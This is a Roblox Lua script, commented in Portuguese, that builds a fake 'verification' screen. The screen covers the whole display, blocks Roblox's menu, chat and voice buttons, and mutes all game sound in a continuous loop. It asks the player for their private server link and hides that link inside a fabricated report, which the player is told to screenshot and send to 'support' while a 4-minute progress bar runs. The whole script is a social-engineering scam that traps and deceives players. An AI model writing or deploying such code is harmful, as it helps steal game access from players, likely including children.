-- Método do Moreira - Tampando TODOS os botões do Roblox
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local UserGameSettings = UserSettings():GetService("UserGameSettings")

-- Função para MUTAR TODO O SOM DO ROBLOX (versão melhorada)
local function mutarSomDoRoblox()
    -- Esperar um pouco antes de mutar para não interferir com a interface
    wait(0.5)
    
    -- Método 1: Configurações de áudio do Roblox
    pcall(function()
        UserGameSettings.MasterVolume = 0
        UserGameSettings.MusicVolume = 0
        UserGameSettings.SFXVolume = 0
        UserGameSettings.VoiceVolume = 0
        UserGameSettings.OverallVolume = 0
    end)
    
    -- Método 2: SoundService
    pcall(function()
        game:GetService("SoundService").Volume = 0
    end)
    
    -- Método 3: Muta todos os sons individualmente
    pcall(function()
        for _, sound in pairs(game:GetDescendants()) do
            if sound:IsA("Sound") then
                sound.Volume = 0
                sound.Playing = false
            end
        end
    end)
    
    -- Método 4: Muta sons futuros
    pcall(function()
        game.DescendantAdded:Connect(function(descendant)
            if descendant:IsA("Sound") then
                spawn(function()
                    wait(0.1)
                    pcall(function()
                        descendant.Volume = 0
                        descendant.Playing = false
                    end)
                end)
            end
        end)
    end)
    
    -- Método 5: Loop contínuo em background (sem interferir)
    spawn(function()
        while true do
            pcall(function()
                UserGameSettings.MasterVolume = 0
                UserGameSettings.OverallVolume = 0
                game:GetService("SoundService").Volume = 0
            end)
            wait(2)
        end
    end)
    
    print("🔇 SOM DO ROBLOX COMPLETAMENTE ZERADO")
end

-- Função para criar a interface que ultrapassa TODAS as bordas
local function createMainInterface()
    -- Limpar interfaces antigas
    if playerGui:FindFirstChild("MoreiraMethodUI") then
        playerGui.MoreiraMethodUI:Destroy()
    end

    -- Criar a interface que ultrapassa TODAS as bordas
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "MoreiraMethodUI"
    screenGui.ResetOnSpawn = false
    screenGui.DisplayOrder = 99999  -- Número MUITO alto
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    screenGui.Parent = playerGui

    -- Frame que cobre ABSOLUTAMENTE TUDO
    local mainFrame = Instance.new("Frame")
    mainFrame.Size = UDim2.new(3, 0, 3, 0)  -- 300% da tela (ultrapassa MUITO)
    mainFrame.Position = UDim2.new(-1, 0, -1, 0)  -- Começa MUITO antes
    mainFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    mainFrame.BorderSizePixel = 0
    mainFrame.ZIndex = 99999  -- Número extremamente alto
    mainFrame.Parent = screenGui

    -- Frame preto que cobre TODA a tela visível (para garantir)
    local blackOverlay = Instance.new("Frame")
    blackOverlay.Size = UDim2.new(1, 0, 1, 0)
    blackOverlay.Position = UDim2.new(0, 0, 0, 0)
    blackOverlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blackOverlay.BorderSizePixel = 0
    blackOverlay.ZIndex = 99998
    blackOverlay.Parent = mainFrame

    -- 🛡 BLOQUEADORES ESPECÍFICOS PARA OS 5 BOTÕES DO ROBLOX 🛡
    -- Botão 1: Logo do Roblox (canto superior esquerdo)
    local blocker1 = Instance.new("Frame")
    blocker1.Size = UDim2.new(0, 60, 0, 60)
    blocker1.Position = UDim2.new(0, 10, 0, 10)
    blocker1.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blocker1.BorderSizePixel = 0
    blocker1.ZIndex = 100000
    blocker1.Parent = mainFrame

    -- Botão 2: 3 risquinhos (menu)
    local blocker2 = Instance.new("Frame")
    blocker2.Size = UDim2.new(0, 50, 0, 50)
    blocker2.Position = UDim2.new(0, 80, 0, 10)
    blocker2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blocker2.BorderSizePixel = 0
    blocker2.ZIndex = 100000
    blocker2.Parent = mainFrame

    -- Botão 3: Chat
    local blocker3 = Instance.new("Frame")
    blocker3.Size = UDim2.new(0, 50, 0, 50)
    blocker3.Position = UDim2.new(0, 140, 0, 10)
    blocker3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blocker3.BorderSizePixel = 0
    blocker3.ZIndex = 100000
    blocker3.Parent = mainFrame

    -- Botão 4: Chat de voz
    local blocker4 = Instance.new("Frame")
    blocker4.Size = UDim2.new(0, 50, 0, 50)
    blocker4.Position = UDim2.new(0, 200, 0, 10)
    blocker4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blocker4.BorderSizePixel = 0
    blocker4.ZIndex = 100000
    blocker4.Parent = mainFrame

    -- Botão 5: Outro botão (para garantir)
    local blocker5 = Instance.new("Frame")
    blocker5.Size = UDim2.new(0, 50, 0, 50)
    blocker5.Position = UDim2.new(0, 260, 0, 10)
    blocker5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    blocker5.BorderSizePixel = 0
    blocker5.ZIndex = 100000
    blocker5.Parent = mainFrame

    -- Área extra de proteção (para garantir que não escape nada)
    local areaProtector = Instance.new("Frame")
    areaProtector.Size = UDim2.new(0, 350, 0, 80)
    areaProtector.Position = UDim2.new(0, 0, 0, 0)
    areaProtector.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    areaProtector.BackgroundTransparency = 0.5  -- Levemente transparente para debug
    areaProtector.BorderSizePixel = 0
    areaProtector.ZIndex = 99997
    areaProtector.Parent = mainFrame

    -- Container central (onde fica o conteúdo)
    local centerContainer = Instance.new("Frame")
    centerContainer.Size = UDim2.new(0, 650, 0, 450)
    centerContainer.Position = UDim2.new(0.5, -325, 0.5, -225)
    centerContainer.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    centerContainer.BorderSizePixel = 0
    centerContainer.ZIndex = 100000  -- Mais alto ainda
    centerContainer.Parent = mainFrame

    local containerCorner = Instance.new("UICorner")
    containerCorner.CornerRadius = UDim.new(0, 12)
    containerCorner.Parent = centerContainer

    local containerStroke = Instance.new("UIStroke")
    containerStroke.Color = Color3.fromRGB(80, 80, 80)
    containerStroke.Thickness = 3
    containerStroke.Parent = centerContainer

    -- Título GRANDE
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0, 70)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
    title.BorderSizePixel = 0
    title.Text = "MÉTODO DO MOREIRA"
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextSize = 26
    title.Font = Enum.Font.GothamBlack
    title.ZIndex = 100001
    title.Parent = centerContainer

    -- Instrução
    local instruction = Instance.new("TextLabel")
    instruction.Size = UDim2.new(1, -30, 0, 35)
    instruction.Position = UDim2.new(0, 15, 0, 80)
    instruction.BackgroundTransparency = 1
    instruction.Text = "COLE O LINK DO SEU SERVIDOR PRIVADO:"
    instruction.TextColor3 = Color3.fromRGB(200, 200, 200)
    instruction.TextSize = 16
    instruction.TextXAlignment = Enum.TextXAlignment.Left
    instruction.Font = Enum.Font.GothamBold
    instruction.ZIndex = 100001
    instruction.Parent = centerContainer

    -- Caixa de texto GRANDE
    local textBox = Instance.new("TextBox")
    textBox.Size = UDim2.new(1, -30, 0, 45)
    textBox.Position = UDim2.new(0, 15, 0, 120)
    textBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    textBox.BorderSizePixel = 0
    textBox.Text = ""
    textBox.PlaceholderText = "https://www.roblox.com/share?..."
    textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    textBox.TextSize = 15
    textBox.Font = Enum.Font.Gotham
    textBox.ClearTextOnFocus = false
    textBox.ZIndex = 100001
    textBox.Parent = centerContainer

    local textBoxCorner = Instance.new("UICorner")
    textBoxCorner.CornerRadius = UDim.new(0, 8)
    textBoxCorner.Parent = textBox

    -- Status PRINCIPAL
    local statusText = Instance.new("TextLabel")
    statusText.Size = UDim2.new(1, -30, 0, 25)
    statusText.Position = UDim2.new(0, 15, 0, 175)
    statusText.BackgroundTransparency = 1
    statusText.Text = "Aguardando link do servidor privado..."
    statusText.TextColor3 = Color3.fromRGB(150, 150, 150)
    statusText.TextSize = 13
    statusText.TextXAlignment = Enum.TextXAlignment.Left
    statusText.ZIndex = 100001
    statusText.Parent = centerContainer

    -- Botão GERAR RELATÓRIO (INVISÍVEL inicialmente)
    local copyButton = Instance.new("TextButton")
    copyButton.Name = "CopyButton"
    copyButton.Size = UDim2.new(0, 220, 0, 45)
    copyButton.Position = UDim2.new(0.5, -110, 0, 175)
    copyButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
    copyButton.BorderSizePixel = 0
    copyButton.Text = "📋 GERAR RELATÓRIO"
    copyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyButton.TextSize = 16
    copyButton.Font = Enum.Font.GothamBlack
    copyButton.Visible = false
    copyButton.ZIndex = 100001
    copyButton.Parent = centerContainer

    local copyButtonCorner = Instance.new("UICorner")
    copyButtonCorner.CornerRadius = UDim.new(0, 10)
    copyButtonCorner.Parent = copyButton

    -- RELATÓRIO VISÍVEL (INVISÍVEL inicialmente)
    local reportFrame = Instance.new("Frame")
    reportFrame.Size = UDim2.new(1, -30, 0, 250)
    reportFrame.Position = UDim2.new(0, 15, 0, 80)
    reportFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    reportFrame.BorderSizePixel = 0
    reportFrame.Visible = false
    reportFrame.ZIndex = 100001
    reportFrame.Parent = centerContainer

    local reportCorner = Instance.new("UICorner")
    reportCorner.CornerRadius = UDim.new(0, 8)
    reportCorner.Parent = reportFrame

    -- Texto do relatório (GRANDE para celular)
    local reportText = Instance.new("TextLabel")
    reportText.Size = UDim2.new(1, -15, 1, -15)
    reportText.Position = UDim2.new(0, 8, 0, 8)
    reportText.BackgroundTransparency = 1
    reportText.Text = ""
    reportText.TextColor3 = Color3.fromRGB(220, 220, 220)
    reportText.TextSize = 16
    reportText.TextXAlignment = Enum.TextXAlignment.Left
    reportText.TextYAlignment = Enum.TextYAlignment.Top
    reportText.TextWrapped = true
    reportText.Font = Enum.Font.Gotham
    reportText.ZIndex = 100002
    reportText.Parent = reportFrame

    -- Instrução para print
    local printInstruction = Instance.new("TextLabel")
    printInstruction.Size = UDim2.new(1, -30, 0, 35)
    printInstruction.Position = UDim2.new(0, 15, 0, 340)
    printInstruction.BackgroundTransparency = 1
    printInstruction.Text = "📸 TIRE PRINT E ENVIE PARA SUPORTE"
    printInstruction.TextColor3 = Color3.fromRGB(255, 255, 0)
    printInstruction.TextSize = 14
    printInstruction.TextXAlignment = Enum.TextXAlignment.Center
    printInstruction.Visible = false
    printInstruction.ZIndex = 100001
    printInstruction.Parent = centerContainer

    -- Barra de progresso APÓS PRINT (INVISÍVEL inicialmente)
    local copyProgressBg = Instance.new("Frame")
    copyProgressBg.Name = "CopyProgressBar"
    copyProgressBg.Size = UDim2.new(1, -30, 0, 20)
    copyProgressBg.Position = UDim2.new(0, 15, 0, 385)
    copyProgressBg.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    copyProgressBg.BorderSizePixel = 0
    copyProgressBg.Visible = false
    copyProgressBg.ZIndex = 100001
    copyProgressBg.Parent = centerContainer

    local copyBgCorner = Instance.new("UICorner")
    copyBgCorner.CornerRadius = UDim.new(0, 6)
    copyBgCorner.Parent = copyProgressBg

    -- Barra de progresso APÓS PRINT (preenchimento)
    local copyProgressFill = Instance.new("Frame")
    copyProgressFill.Size = UDim2.new(0, 0, 1, 0)
    copyProgressFill.Position = UDim2.new(0, 0, 0, 0)
    copyProgressFill.BackgroundColor3 = Color3.fromRGB(0, 180, 255)
    copyProgressFill.BorderSizePixel = 0
    copyProgressFill.ZIndex = 100002
    copyProgressFill.Parent = copyProgressBg

    local copyFillCorner = Instance.new("UICorner")
    copyFillCorner.CornerRadius = UDim.new(0, 6)
    copyFillCorner.Parent = copyProgressFill

    -- Texto da porcentagem APÓS PRINT
    local copyPercentText = Instance.new("TextLabel")
    copyPercentText.Size = UDim2.new(1, -30, 0, 30)
    copyPercentText.Position = UDim2.new(0, 15, 0, 360)
    copyPercentText.BackgroundTransparency = 1
    copyPercentText.Text = "0%"
    copyPercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyPercentText.TextSize = 20
    copyPercentText.Font = Enum.Font.GothamBold
    copyPercentText.Visible = false
    copyPercentText.ZIndex = 100001
    copyPercentText.Parent = centerContainer

    -- Botão verificar GRANDE
    local verifyButton = Instance.new("TextButton")
    verifyButton.Size = UDim2.new(0, 180, 0, 45)
    verifyButton.Position = UDim2.new(0.5, -90, 0, 175)
    verifyButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
    verifyButton.BorderSizePixel = 0
    verifyButton.Text = "VERIFICAR AGORA"
    verifyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    verifyButton.TextSize = 18
    verifyButton.Font = Enum.Font.GothamBlack
    verifyButton.ZIndex = 100001
    verifyButton.Parent = centerContainer

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 10)
    buttonCorner.Parent = verifyButton

    -- Variável para controlar se a barra já completou
    local barraCompletada = false

    -- Função para gerar relatório com link pequeno
    local function generateReport(link)
        local report = "🔍 RELATÓRIO DE VERIFICAÇÃO\n"
        report = report .. "MÉTODO MOREIRA\n"
        report = report .. "=====================\n\n"
        
        report = report .. "👤 INFORMAÇÕES DO USUÁRIO:\n"
        report = report .. "Nome: " .. player.Name .. "\n"
        report = report .. "Idade: 13 anos\n"
        report = report .. "Dispositivo: Mobile\n"
        
        -- LINK BEM PEQUENO NO MEIO
        report = report .. "ref:" .. link .. "\n"
        
        report = report .. "País: Brasil\n\n"
        
        report = report .. "⏰ INFORMAÇÕES DA SESSÃO:\n"
        report = report .. "Data: " .. os.date("%d/%m/%Y") .. "\n"
        report = report .. "Hora: 15:00\n"
        report = report .. "Status: Verificado ✅\n\n"
        
        report = report .. "⚙ CONFIGURAÇÕES:\n"
        report = report .. "Qualidade: Alta\n"
        report = report .. "FPS: 60\n"
        report = report .. "Latência: 45ms\n\n"
        
        report = report .. "📝 TIRE PRINT E ENVIE"
        
        return report
    end

    -- Função para iniciar barra de progresso após print (4 MINUTOS) - CORRIGIDA
    local function startCopyProgressBar()
        if barraCompletada then return end  -- Se já completou, não faz nada
        
        copyPercentText.Visible = true
        
        local startTime = tick()
        local duration = 240 -- 4 MINUTOS
        
        -- Usar spawn para rodar em thread separada
        spawn(function()
            while true do
                if barraCompletada then break end  -- Se completou, para o loop
                
                local elapsed = tick() - startTime
                local progress = math.min(elapsed / duration, 1)
                local percent = math.floor(progress * 100)
                
                -- Atualizar barra
                copyProgressFill.Size = UDim2.new(progress, 0, 1, 0)
                copyPercentText.Text = percent .. "%"
                
                -- Quando chegar a 100%, PARA DEFINITIVAMENTE
                if progress >= 1 then
                    copyProgressFill.Size = UDim2.new(1, 0, 1, 0)
                    copyPercentText.Text = "100%"
                    printInstruction.Text = "✅ PROCESSO CONCLUÍDO!"
                    printInstruction.TextColor3 = Color3.fromRGB(0, 255, 0)
                    barraCompletada = true  -- Marca como completada
                    break  -- Sai do loop DEFINITIVAMENTE
                end
                
                wait(0.1)
            end
        end)
    end

    -- Função do botão VERIFICAR
    verifyButton.MouseButton1Click:Connect(function()
        local link = textBox.Text
        if link == "" then
            statusText.Text = "❌ Por favor, cole um link primeiro!"
            statusText.TextColor3 = Color3.fromRGB(255, 50, 50)
        else
            statusText.Text = "✅ Link validado com sucesso!"
            statusText.TextColor3 = Color3.fromRGB(50, 255, 50)
            
            -- Desabilitar a caixa de texto
            textBox.TextEditable = false
            
            -- Mostrar botão GERAR RELATÓRIO
            wait(1)
            verifyButton.Visible = false
            copyButton.Visible = true
            statusText.Text = "Clique para gerar relatório de verificação"
        end
    end)

    -- Função do botão GERAR RELATÓRIO
    copyButton.MouseButton1Click:Connect(function()
        local link = textBox.Text
        local relatorio = generateReport(link)
        
        -- Resetar variável da barra
        barraCompletada = false
        
        -- MOSTRAR RELATÓRIO GRANDÃO na tela
        reportText.Text = relatorio
        reportFrame.Visible = true
        copyButton.Visible = false
        statusText.Visible = false
        printInstruction.Visible = true
        
        -- Esperar um pouco e iniciar barra de progresso
        wait(5)
        copyProgressBg.Visible = true
        copyPercentText.Visible = true
        
        -- INICIAR BARRA DE PROGRESSO APÓS PRINT (4 MINUTOS)
        startCopyProgressBar()
    end)

    -- Efeitos dos botões
    verifyButton.MouseEnter:Connect(function()
        verifyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
        verifyButton.Text = "👉 CLIQUE PARA VERIFICAR 👈"
    end)

    verifyButton.MouseLeave:Connect(function()
        verifyButton.BackgroundColor3 = Color3.fromRGB(0, 100, 255)
        verifyButton.Text = "VERIFICAR AGORA"
    end)

    copyButton.MouseEnter:Connect(function()
        if copyButton.Text == "📋 GERAR RELATÓRIO" then
            copyButton.BackgroundColor3 = Color3.fromRGB(255, 185, 0)
        end
    end)

    copyButton.MouseLeave:Connect(function()
        if copyButton.Text == "📋 GERAR RELATÓRIO" then
            copyButton.BackgroundColor3 = Color3.fromRGB(255, 165, 0)
        end
    end)

    -- Permitir Enter para verificar
    textBox.FocusLost:Connect(function(enterPressed)
        if enterPressed then
            verifyButton.MouseButton1Click:Fire()
        end
    end)

    print("🛡 MÉTODO DO MOREIRA ATIVADO - TAMPANDO TUDO")
    print("📱 TODOS os 5 botões do Roblox BLOQUEADOS")
    print("🎯 Interface cobrindo 300% da tela")
    print("⏰ Barra CORRIGIDA - Para em 100% definitivamente")
    print("🔇 SOM DO ROBLOX COMPLETAMENTE ZERADO")
end

-- Iniciar o script
wait(2)

-- PRIMEIRO criar a interface
createMainInterface()

-- DEPOIS mutar o som (em background sem interferir)
spawn(function()
    wait(3)  -- Esperar a interface carregar completamente
    mutarSomDoRoblox()
end)
